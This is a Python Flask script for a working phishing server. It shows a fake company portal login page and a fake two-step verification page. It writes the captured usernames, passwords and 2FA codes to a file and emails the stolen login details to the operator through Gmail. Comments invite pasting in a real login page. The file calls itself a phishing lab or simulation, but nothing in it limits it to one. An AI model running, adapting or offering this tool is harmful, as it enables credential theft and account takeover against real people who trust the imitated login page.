from flask import Flask, request, render_template_string, redirect, url_for
import os
from datetime import datetime
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

LOG_FILE = "credentials.txt"

# ==== Configuration ====
EMAIL_ALERTS = True
EMAIL_TO = input("Enter target email: ")
EMAIL_FROM = input("Enter your gmail: ")
EMAIL_PASSWORD = input("Enter your gmail password: ")  # Use App Password or token
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
# ======================= Login page, put your login page code here

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <div style="margin:100px auto;width:300px;padding:20px;background:#eee;border-radius:10px;">
        <h3>Company Portal Login</h3>
        <form method="POST">
            <input name="username" placeholder="Username" required><br><br>
            <input type="password" name="password" placeholder="Password" required><br><br>
            <input type="submit" value="Login">
        </form>
    </div>
</body>
</html>
"""

# 2FA page, put your 2FA page here
TWOFA_PAGE = """
<!DOCTYPE html>
<html>
<head><title>2FA Required</title></head>
<body>
    <div style="margin:100px auto;width:300px;padding:20px;background:#eee;border-radius:10px;">
        <h3>2-Step Verification</h3>
        <form method="POST">
            <input name="code" placeholder="Enter 6-digit code" required><br><br>
            <input type="submit" value="Verify">
        </form>
    </div>
</body>
</html>
"""

# SUCCESS page, put your success page here
SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Done</title></head>
<body>
    <div style="margin:100px auto;width:300px;padding:20px;background:#eee;border-radius:10px;">
        <h3>Verification complete</h3>
        <p>You may now close this page.</p>
    </div>
</body>
</html>
"""

def send_email_alert(message):
    try:
        msg = MIMEText(message)
        msg['Subject'] = 'Phishing Lab: New Credentials Captured'
        msg['From'] = EMAIL_FROM
        msg['To'] = EMAIL_TO

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_FROM, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("[+] Email alert sent.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        user = request.form.get("username")
        pwd = request.form.get("password")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        log_entry = f"[{timestamp}] Username: {user}, Password: {pwd}\n"
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
        print(log_entry.strip())

        if EMAIL_ALERTS:
            send_email_alert(log_entry)

        return redirect(url_for('twofa'))
    return render_template_string(LOGIN_PAGE)

@app.route("/2fa", methods=["GET", "POST"])
def twofa():
    if request.method == "POST":
        code = request.form.get("code")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] 2FA Code Entered: {code}\n"
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
        print(log_entry.strip())
        return render_template_string(SUCCESS_PAGE)
    return render_template_string(TWOFA_PAGE)

if __name__ == "__main__":
    print("[+] Phishing simulation server running at http://0.0.0.0:8080/")
    app.run(host="0.0.0.0", port=8080)
